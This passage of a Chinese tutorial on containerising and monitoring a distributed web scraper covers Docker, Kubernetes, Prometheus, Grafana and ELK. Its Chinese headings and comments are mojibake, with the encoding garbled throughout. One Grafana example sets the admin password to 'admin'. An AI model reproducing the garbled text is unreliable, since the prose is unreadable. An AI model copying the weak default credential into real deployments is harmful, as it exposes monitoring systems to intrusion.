      <div class="codehilite">
        <pre><span></span><code><span class="c"># æ„å»ºé˜¶æ®µ</span>
<span class="k">FROM</span><span class="w"> </span><span class="s">python:3.11</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="s">builder</span>

<span class="k">WORKDIR</span><span class="w"> </span><span class="s">/app</span>
<span class="k">COPY</span><span class="w"> </span>requirements.txt<span class="w"> </span>.
<span class="k">RUN</span><span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>--user<span class="w"> </span>--no-cache-dir<span class="w"> </span>-r<span class="w"> </span>requirements.txt

<span class="c"># è¿è¡Œé˜¶æ®µ</span>
<span class="k">FROM</span><span class="w"> </span><span class="s">python:3.11-slim</span>

<span class="k">WORKDIR</span><span class="w"> </span><span class="s">/app</span>

<span class="c"># ä»æ„å»ºé˜¶æ®µå¤åˆ¶ä¾èµ–</span>
<span class="k">COPY</span><span class="w"> </span>--from<span class="o">=</span>builder<span class="w"> </span>/root/.local<span class="w"> </span>/root/.local
<span class="k">COPY</span><span class="w"> </span>.<span class="w"> </span>.

<span class="k">ENV</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>/root/.local/bin:<span class="nv">$PATH</span>

<span class="k">CMD</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;python&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;main.py&quot;</span><span class="p">]</span>
</code></pre>
      </div>

      <h3 id="2-ä½¿ç”¨-dockerignore">2. ä½¿ç”¨ .dockerignore</h3>

      <pre><code>__pycache__
*.pyc
*.pyo
*.pyd
.Python
.env
venv/
.git
.gitignore
*.md
.pytest_cache
.coverage
htmlcov/
</code></pre>

      <h3 id="3-å¥åº·æ£€æŸ¥">3. å¥åº·æ£€æŸ¥</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="k">HEALTHCHECK</span><span class="w"> </span>--interval<span class="o">=</span>30s<span class="w"> </span>--timeout<span class="o">=</span>3s<span class="w"> </span>--retries<span class="o">=</span><span class="m">3</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span><span class="k">CMD</span><span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;import requests; requests.get(&#39;http://localhost:8000/health&#39;)&quot;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nb">exit</span><span class="w"> </span><span class="m">1</span>
</code></pre>
      </div>

      <h3 id="4-ç¯å¢ƒå˜é‡ç®¡ç†">4. ç¯å¢ƒå˜é‡ç®¡ç†</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># docker-compose.yml</span>
<span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="nt">spider</span><span class="p">:</span>
<span class="w">    </span><span class="nt">env_file</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">.env</span>
</code></pre>
      </div>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># .env æ–‡ä»¶</span>
<span class="nv">REDIS_URL</span><span class="o">=</span>redis://redis:6379
<span class="nv">API_KEY</span><span class="o">=</span>your_api_key_here
<span class="nv">PROXY_URL</span><span class="o">=</span>http://proxy.example.com
</code></pre>
      </div>

      <hr />

      <h2 id="ç”Ÿäº§éƒ¨ç½²">ç”Ÿäº§éƒ¨ç½²</h2>

      <h3 id="ä½¿ç”¨-docker-swarm">ä½¿ç”¨ Docker Swarm</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># åˆå§‹åŒ– Swarm</span>
docker<span class="w"> </span>swarm<span class="w"> </span>init

<span class="c1"># éƒ¨ç½²æœåŠ¡æ ˆ</span>
docker<span class="w"> </span>stack<span class="w"> </span>deploy<span class="w"> </span>-c<span class="w"> </span>docker-compose.yml<span class="w"> </span>spider

<span class="c1"># æŸ¥çœ‹æœåŠ¡çŠ¶æ€</span>
docker<span class="w"> </span>service<span class="w"> </span>ls

<span class="c1"># æ‰©å±•æœåŠ¡</span>
docker<span class="w"> </span>service<span class="w"> </span>scale<span class="w"> </span>spider_spider-worker<span class="o">=</span><span class="m">10</span>

<span class="c1"># åˆ é™¤æœåŠ¡æ ˆ</span>
docker<span class="w"> </span>stack<span class="w"> </span>rm<span class="w"> </span>spider
</code></pre>
      </div>

      <h3 id="ä½¿ç”¨-kubernetes">ä½¿ç”¨ Kubernetes</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># deployment.yaml</span>
<span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">apps/v1</span>
<span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Deployment</span>
<span class="nt">metadata</span><span class="p">:</span>
<span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">spider-worker</span>
<span class="nt">spec</span><span class="p">:</span>
<span class="w">  </span><span class="nt">replicas</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">3</span>
<span class="w">  </span><span class="nt">selector</span><span class="p">:</span>
<span class="w">    </span><span class="nt">matchLabels</span><span class="p">:</span>
<span class="w">      </span><span class="nt">app</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">spider-worker</span>
<span class="w">  </span><span class="nt">template</span><span class="p">:</span>
<span class="w">    </span><span class="nt">metadata</span><span class="p">:</span>
<span class="w">      </span><span class="nt">labels</span><span class="p">:</span>
<span class="w">        </span><span class="nt">app</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">spider-worker</span>
<span class="w">    </span><span class="nt">spec</span><span class="p">:</span>
<span class="w">      </span><span class="nt">containers</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">spider</span>
<span class="w">        </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">myregistry/spider:latest</span>
<span class="w">        </span><span class="nt">env</span><span class="p">:</span>
<span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">REDIS_URL</span>
<span class="w">          </span><span class="nt">value</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;redis://redis:6379&quot;</span>
<span class="w">        </span><span class="nt">resources</span><span class="p">:</span>
<span class="w">          </span><span class="nt">requests</span><span class="p">:</span>
<span class="w">            </span><span class="nt">memory</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;512Mi&quot;</span>
<span class="w">            </span><span class="nt">cpu</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;500m&quot;</span>
<span class="w">          </span><span class="nt">limits</span><span class="p">:</span>
<span class="w">            </span><span class="nt">memory</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;1Gi&quot;</span>
<span class="w">            </span><span class="nt">cpu</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;1000m&quot;</span>
</code></pre>
      </div>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># éƒ¨ç½²</span>
kubectl<span class="w"> </span>apply<span class="w"> </span>-f<span class="w"> </span>deployment.yaml

<span class="c1"># æ‰©å±•</span>
kubectl<span class="w"> </span>scale<span class="w"> </span>deployment<span class="w"> </span>spider-worker<span class="w"> </span>--replicas<span class="o">=</span><span class="m">10</span>

<span class="c1"># æŸ¥çœ‹çŠ¶æ€</span>
kubectl<span class="w"> </span>get<span class="w"> </span>pods
</code></pre>
      </div>

      <hr />

      <h2 id="ç›‘æ§ä¸æ—¥å¿—">ç›‘æ§ä¸æ—¥å¿—</h2>

      <h3 id="æ—¥å¿—ç®¡ç†">æ—¥å¿—ç®¡ç†</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="nt">spider</span><span class="p">:</span>
<span class="w">    </span><span class="nt">logging</span><span class="p">:</span>
<span class="w">      </span><span class="nt">driver</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;json-file&quot;</span>
<span class="w">      </span><span class="nt">options</span><span class="p">:</span>
<span class="w">        </span><span class="nt">max-size</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;10m&quot;</span>
<span class="w">        </span><span class="nt">max-file</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;3&quot;</span>
</code></pre>
      </div>

      <h3 id="é›†æˆ-prometheus">é›†æˆ Prometheus</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="nt">prometheus</span><span class="p">:</span>
<span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">prom/prometheus</span>
<span class="w">    </span><span class="nt">ports</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;9090:9090&quot;</span>
<span class="w">    </span><span class="nt">volumes</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">./prometheus.yml:/etc/prometheus/prometheus.yml</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">prometheus_data:/prometheus</span>

<span class="w">  </span><span class="nt">grafana</span><span class="p">:</span>
<span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">grafana/grafana</span>
<span class="w">    </span><span class="nt">ports</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;3000:3000&quot;</span>
<span class="w">    </span><span class="nt">volumes</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">grafana_data:/var/lib/grafana</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å¸¸è§é—®é¢˜">å¸¸è§é—®é¢˜</h2>

      <h3 id="q1-å®¹å™¨å†…æ—¶åŒºä¸æ­£ç¡®">Q1: å®¹å™¨å†…æ—¶åŒºä¸æ­£ç¡®ï¼Ÿ</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="k">RUN</span><span class="w"> </span>ln<span class="w"> </span>-sf<span class="w"> </span>/usr/share/zoneinfo/Asia/Shanghai<span class="w"> </span>/etc/localtime
<span class="k">RUN</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Asia/Shanghai&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>/etc/timezone
</code></pre>
      </div>

      <h3 id="q2-å¦‚ä½•è°ƒè¯•å®¹å™¨å†…çš„åº”ç”¨">Q2: å¦‚ä½•è°ƒè¯•å®¹å™¨å†…çš„åº”ç”¨ï¼Ÿ</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># è¿›å…¥å®¹å™¨</span>
docker<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>-it<span class="w"> </span>container_id<span class="w"> </span>/bin/bash

<span class="c1"># æŸ¥çœ‹æ—¥å¿—</span>
docker<span class="w"> </span>logs<span class="w"> </span>-f<span class="w"> </span>container_id

<span class="c1"># å®æ—¶æŸ¥çœ‹èµ„æºä½¿ç”¨</span>
docker<span class="w"> </span>stats<span class="w"> </span>container_id
</code></pre>
      </div>

      <h3 id="q3-å¦‚ä½•æŒä¹…åŒ–æ•°æ®">Q3: å¦‚ä½•æŒä¹…åŒ–æ•°æ®ï¼Ÿ</h3>

      <p>ä½¿ç”¨ Docker Volumeï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="nt">spider</span><span class="p">:</span>
<span class="w">    </span><span class="nt">volumes</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">spider_data:/app/data</span>

<span class="nt">volumes</span><span class="p">:</span>
<span class="w">  </span><span class="nt">spider_data</span><span class="p">:</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#06-Engineering-distributed-scraping">åˆ†å¸ƒå¼çˆ¬è™«æ¶æ„</a></li>
        <li><a href="#06-Engineering-monitoring-and-alerting">ç›‘æ§ä¸å‘Šè­¦ç³»ç»Ÿ</a></li>
        <li><a href="#06-Engineering-message-queue-application">æ¶ˆæ¯é˜Ÿåˆ—åº”ç”¨</a></li>
      </ul>

    </div>

    <div class="section" id="06-Engineering-monitoring-and-alerting">
      <h2>56. Monitoring And Alerting</h2>
      <h1 id="ç›‘æ§ä¸å‘Šè­¦ç³»ç»Ÿ">ç›‘æ§ä¸å‘Šè­¦ç³»ç»Ÿ</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>ç›‘æ§å’Œå‘Šè­¦æ˜¯ä¿éšœåˆ†å¸ƒå¼çˆ¬è™«ç³»ç»Ÿç¨³å®šè¿è¡Œçš„å…³é”®ã€‚æœ¬ç« ä»‹ç»å¦‚ä½•æ„å»ºå®Œæ•´çš„ç›‘æ§å’Œå‘Šè­¦ä½“ç³»ã€‚</p>

      <hr />

      <h2 id="ç›‘æ§ä½“ç³»æ¶æ„">ç›‘æ§ä½“ç³»æ¶æ„</h2>

      <pre><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         Scraper Nodes                â”‚
â”‚  - Metrics Exporter (Prometheus)     â”‚
â”‚  - Logging (Fluentd/Filebeat)        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚
    â”Œâ”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”
    â”‚             â”‚
    â–¼             â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚Prometheusâ”‚  â”‚    ELK   â”‚
â”‚(Metrics) â”‚  â”‚  (Logs)  â”‚
â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜
     â”‚            â”‚
     â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜
            â–¼
     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
     â”‚   Grafana   â”‚
     â”‚ (å¯è§†åŒ–)     â”‚
     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
            â”‚
            â–¼
     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
     â”‚ AlertManagerâ”‚
     â”‚   (å‘Šè­¦)     â”‚
     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>

      <hr />

      <h2 id="prometheus-ç›‘æ§">Prometheus ç›‘æ§</h2>

      <h3 id="å®‰è£…éƒ¨ç½²">å®‰è£…éƒ¨ç½²</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># docker-compose.yml</span>
<span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;3&#39;</span>
<span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="nt">prometheus</span><span class="p">:</span>
<span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">prom/prometheus:latest</span>
<span class="w">    </span><span class="nt">ports</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;9090:9090&quot;</span>
<span class="w">    </span><span class="nt">volumes</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">./prometheus.yml:/etc/prometheus/prometheus.yml</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">prometheus_data:/prometheus</span>
<span class="w">    </span><span class="nt">command</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&#39;--config.file=/etc/prometheus/prometheus.yml&#39;</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&#39;--storage.tsdb.path=/prometheus&#39;</span>

<span class="w">  </span><span class="nt">grafana</span><span class="p">:</span>
<span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">grafana/grafana:latest</span>
<span class="w">    </span><span class="nt">ports</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;3000:3000&quot;</span>
<span class="w">    </span><span class="nt">volumes</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">grafana_data:/var/lib/grafana</span>
<span class="w">    </span><span class="nt">environment</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">GF_SECURITY_ADMIN_PASSWORD=admin</span>

<span class="nt">volumes</span><span class="p">:</span>
<span class="w">  </span><span class="nt">prometheus_data</span><span class="p">:</span>
<span class="w">  </span><span class="nt">grafana_data</span><span class="p">:</span>
</code></pre>
      </div>

      <h3 id="prometheus-é…ç½®">Prometheus é…ç½®</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># prometheus.yml</span>
<span class="nt">global</span><span class="p">:</span>
<span class="w">  </span><span class="nt">scrape_interval</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">15s</span>
<span class="w">  </span><span class="nt">evaluation_interval</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">15s</span>

<span class="nt">scrape_configs</span><span class="p">:</span>
<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">job_name</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;scraper&#39;</span>
<span class="w">    </span><span class="nt">static_configs</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">targets</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&#39;scraper:8000&#39;</span><span class="p p-Indicator">]</span>

<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">job_name</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;redis&#39;</span>
<span class="w">    </span><span class="nt">static_configs</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">targets</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&#39;redis-exporter:9121&#39;</span><span class="p p-Indicator">]</span>

<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">job_name</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;mongodb&#39;</span>
<span class="w">    </span><span class="nt">static_configs</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">targets</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&#39;mongodb-exporter:9216&#39;</span><span class="p p-Indicator">]</span>

<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">job_name</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;node&#39;</span>
<span class="w">    </span><span class="nt">static_configs</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">targets</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&#39;node-exporter:9100&#39;</span><span class="p p-Indicator">]</span>
</code></pre>
      </div>

      <h3 id="python-åº”ç”¨é›†æˆ">Python åº”ç”¨é›†æˆ</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">prometheus_client</span><span class="w"> </span><span class="kn">import</span> <span class="n">Counter</span><span class="p">,</span> <span class="n">Histogram</span><span class="p">,</span> <span class="n">Gauge</span><span class="p">,</span> <span class="n">start_http_server</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="c1"># å®šä¹‰æŒ‡æ ‡</span>
<span class="n">requests_total</span> <span class="o">=</span> <span class="n">Counter</span><span class="p">(</span>
    <span class="s1">&#39;scraper_requests_total&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Total number of requests&#39;</span><span class="p">,</span>
    <span class="p">[</span><span class="s1">&#39;status&#39;</span><span class="p">,</span> <span class="s1">&#39;domain&#39;</span><span class="p">]</span>
<span class="p">)</span>

<span class="n">request_duration</span> <span class="o">=</span> <span class="n">Histogram</span><span class="p">(</span>
    <span class="s1">&#39;scraper_request_duration_seconds&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Request duration in seconds&#39;</span><span class="p">,</span>
    <span class="p">[</span><span class="s1">&#39;domain&#39;</span><span class="p">]</span>
<span class="p">)</span>

<span class="n">active_scrapers</span> <span class="o">=</span> <span class="n">Gauge</span><span class="p">(</span>
    <span class="s1">&#39;scraper_active_workers&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Number of active scrapers&#39;</span>
<span class="p">)</span>

<span class="n">queue_size</span> <span class="o">=</span> <span class="n">Gauge</span><span class="p">(</span>
    <span class="s1">&#39;scraper_queue_size&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Size of the URL queue&#39;</span>
<span class="p">)</span>

<span class="k">class</span><span class="w"> </span><span class="nc">MonitoredScraper</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="c1"># å¯åŠ¨ Prometheus HTTP æœåŠ¡å™¨</span>
        <span class="n">start_http_server</span><span class="p">(</span><span class="mi">8000</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">scrape</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;çˆ¬å– URL å¹¶è®°å½•æŒ‡æ ‡&quot;&quot;&quot;</span>
        <span class="n">domain</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_extract_domain</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

        <span class="c1"># è®°å½•æ´»è·ƒçˆ¬è™«æ•°</span>
        <span class="n">active_scrapers</span><span class="o">.</span><span class="n">inc</span><span class="p">()</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="c1"># è®°å½•è¯·æ±‚æ—¶é•¿</span>
            <span class="k">with</span> <span class="n">request_duration</span><span class="o">.</span><span class="n">labels</span><span class="p">(</span><span class="n">domain</span><span class="o">=</span><span class="n">domain</span><span class="p">)</span><span class="o">.</span><span class="n">time</span><span class="p">():</span>
                <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>

            <span class="c1"># è®°å½•è¯·æ±‚æ€»æ•°</span>
            <span class="n">requests_total</span><span class="o">.</span><span class="n">labels</span><span class="p">(</span>
                <span class="n">status</span><span class="o">=</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">,</span>
                <span class="n">domain</span><span class="o">=</span><span class="n">domain</span>
            <span class="p">)</span><span class="o">.</span><span class="n">inc</span><span class="p">()</span>

            <span class="k">return</span> <span class="n">response</span>

        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="n">requests_total</span><span class="o">.</span><span class="n">labels</span><span class="p">(</span><span class="n">status</span><span class="o">=</span><span class="s1">&#39;error&#39;</span><span class="p">,</span> <span class="n">domain</span><span class="o">=</span><span class="n">domain</span><span class="p">)</span><span class="o">.</span><span class="n">inc</span><span class="p">()</span>
            <span class="k">raise</span>
        <span class="k">finally</span><span class="p">:</span>
            <span class="n">active_scrapers</span><span class="o">.</span><span class="n">dec</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">update_queue_size</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ›´æ–°é˜Ÿåˆ—å¤§å°&quot;&quot;&quot;</span>
        <span class="n">queue_size</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">_extract_domain</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
        <span class="kn">from</span><span class="w"> </span><span class="nn">urllib.parse</span><span class="w"> </span><span class="kn">import</span> <span class="n">urlparse</span>
        <span class="k">return</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">netloc</span>
</code></pre>
      </div>

      <hr />

      <h2 id="grafana-å¯è§†åŒ–">Grafana å¯è§†åŒ–</h2>

      <h3 id="ä»ªè¡¨ç›˜é…ç½®">ä»ªè¡¨ç›˜é…ç½®</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="p">{</span>
<span class="w">  </span><span class="nt">&quot;dashboard&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;title&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Scraper Monitoring&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;panels&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">      </span><span class="p">{</span>
<span class="w">        </span><span class="nt">&quot;title&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Request Rate&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;targets&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">          </span><span class="p">{</span>
<span class="w">            </span><span class="nt">&quot;expr&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;rate(scraper_requests_total[5m])&quot;</span>
<span class="w">          </span><span class="p">}</span>
<span class="w">        </span><span class="p">]</span>
<span class="w">      </span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span>
<span class="w">        </span><span class="nt">&quot;title&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Success Rate&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;targets&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">          </span><span class="p">{</span>
<span class="w">            </span><span class="nt">&quot;expr&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;scraper_success_rate&quot;</span>
<span class="w">          </span><span class="p">}</span>
<span class="w">        </span><span class="p">]</span>
<span class="w">      </span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span>
<span class="w">        </span><span class="nt">&quot;title&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Queue Size&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;targets&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">          </span><span class="p">{</span>
<span class="w">            </span><span class="nt">&quot;expr&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;scraper_queue_size&quot;</span>
<span class="w">          </span><span class="p">}</span>
<span class="w">        </span><span class="p">]</span>
<span class="w">      </span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span>
<span class="w">        </span><span class="nt">&quot;title&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;P95 Response Time&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;targets&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">          </span><span class="p">{</span>
<span class="w">            </span><span class="nt">&quot;expr&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;histogram_quantile(0.95, rate(scraper_request_duration_seconds_bucket[5m]))&quot;</span>
<span class="w">          </span><span class="p">}</span>
<span class="w">        </span><span class="p">]</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">    </span><span class="p">]</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ—¥å¿—æ”¶é›†-elk-stack">æ—¥å¿—æ”¶é›† (ELK Stack)</h2>

      <h3 id="docker-compose-é…ç½®">Docker Compose é…ç½®</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;3&#39;</span>
<span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="nt">elasticsearch</span><span class="p">:</span>
<span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">elasticsearch:8.11.0</span>
<span class="w">    </span><span class="nt">environment</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">discovery.type=single-node</span>
